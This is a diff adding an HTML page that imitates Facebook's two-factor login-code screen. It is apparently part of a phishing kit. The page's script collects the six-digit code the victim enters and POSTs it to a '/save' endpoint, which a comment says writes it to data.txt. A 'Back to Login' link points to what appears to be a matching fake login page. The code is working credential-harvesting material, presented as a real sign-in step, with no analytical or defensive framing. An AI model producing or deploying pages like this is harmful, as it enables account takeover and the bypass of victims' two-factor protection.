@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Viewport settings for responsive design, preventing user scaling -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - Two-Factor Authentication</title>
+    <style>
+        /* Basic reset and font settings */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        /* Body styling for background and centering content */
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            padding: 72px 0;
+        }
+        /* Styling for the authentication box */
+        .auth-box {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px; /* Fixed width for the auth box */
+            text-align: center;
+        }
+        /* Styling for the main heading in the auth box */
+        .auth-box h2 {
+            color: #1c1e21;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        /* Styling for paragraph text in the auth box */
+        .auth-box p {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        /* Container for the 6-digit code input fields */
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        /* Styling for individual code input fields */
+        .code-inputs input {
+            width: 15%; /* Adjust width to fit 6 inputs with spacing */
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+        /* Styling for the "Continue" (verify) button */
+        .auth-btn {
+            background-color: #1877f2; /* Facebook blue */
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        /* Styling for the horizontal divider line */
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 20px 0;
+            text-align: center;
+        }
+        /* Styling for the "Back to Login" button */
+        .back-btn {
+            background-color: #e4e6eb;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: #4b4f56;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+        /* Styling for additional options (resend code, another method) */
+        .options {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .options a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        /* Custom message box styles */
+        .custom-message-box {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1000; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+        }
+        .custom-message-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            border-radius: 8px;
+            width: 80%;
+            max-width: 300px;
+            text-align: center;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19);
+        }
+        .custom-message-content h3 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+        .custom-message-content p {
+            margin-bottom: 20px;
+            color: #555;
+        }
+        .custom-message-content button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-box">
+        <h2>Enter Login Code</h2>
+        <p>We've sent a 6-digit code to your mobile device ending with ••••1234</p>
+
+        <div class="code-inputs">
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric">
+        </div>
+
+        <button class="auth-btn" id="verifyBtn">Continue</button>
+
+        <div class="divider"></div>
+
+        <!-- Changed onclick to navigate to the root path which serves index.html -->
+        <button class="back-btn" onclick="window.location.href='/'">Back to Login</button>
+
+        <div class="options">
+            <p>Didn't receive a code? <a href="#">Resend Code</a> or <a href="#">Use Another Method</a></p>
+        </div>
+    </div>
+
+    <!-- Custom Message Box HTML -->
+    <div id="customMessageBox" class="custom-message-box">
+        <div class="custom-message-content">
+            <h3 id="messageBoxTitle"></h3>
+            <p id="messageBoxText"></p>
+            <button id="messageBoxCloseBtn">OK</button>
+        </div>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll('.code-inputs input');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const customMessageBox = document.getElementById('customMessageBox');
+        const messageBoxTitle = document.getElementById('messageBoxTitle');
+        const messageBoxText = document.getElementById('messageBoxText');
+        const messageBoxCloseBtn = document.getElementById('messageBoxCloseBtn');
+
+        // Function to show custom message box
+        function showMessageBox(title, message) {
+            messageBoxTitle.textContent = title;
+            messageBoxText.textContent = message;
+            customMessageBox.style.display = 'flex'; // Use flex to center content
+        }
+
+        // Function to hide custom message box
+        function hideMessageBox() {
+            customMessageBox.style.display = 'none';
+        }
+
+        // Close button for message box
+        messageBoxCloseBtn.addEventListener('click', hideMessageBox);
+        // Also close if clicked outside the content
+        customMessageBox.addEventListener('click', (e) => {
+            if (e.target === customMessageBox) {
+                hideMessageBox();
+            }
+        });
+
+
+        // Auto-focus first input when the page loads
+        inputs[0].focus();
+
+        // Handle input movement between fields
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                // Move to the next input if the current one is filled
+                if (e.target.value.length === 1) {
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    } else {
+                        // If it's the last input, focus the verify button
+                        verifyBtn.focus();
+                    }
+                }
+            });
+
+            // Handle backspace to move to the previous input
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Verify button click handler
+        verifyBtn.addEventListener('click', function() {
+            let code = '';
+            // Concatenate all input values to form the 6-digit code
+            inputs.forEach(input => {
+                code += input.value;
+            });
+
+            // Validate the code: must be 6 digits and all numeric
+            if (code.length === 6 && /^\d+$/.test(code)) {
+                // Save 2FA code to data.txt via POST request
+                fetch('/save', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `2fa_code=${encodeURIComponent(code)}`
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Show success message using custom message box
+                        showMessageBox('Success', 'Login successful!');
+                        // Optionally, redirect after a short delay or on OK click
+                        // setTimeout(() => window.location.href = '/', 2000);
+                    } else {
+                        // Show error message if server response is not OK
+                        console.error('Server responded with an error:', response.statusText);
+                        showMessageBox('Error', 'Failed to save code. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    // Show error message for network or fetch issues
+                    console.error('Error during fetch operation:', error);
+                    showMessageBox('Error', 'An error occurred. Please check your network connection.');
+                });
+            } else {
+                // Show error message if the code is invalid
+                showMessageBox('Invalid Code', 'Please enter a valid 6-digit code.');
+                inputs[0].focus(); // Focus back to the first input for correction
+            }
+        });
+    </script>
+</body>
+</html>
+
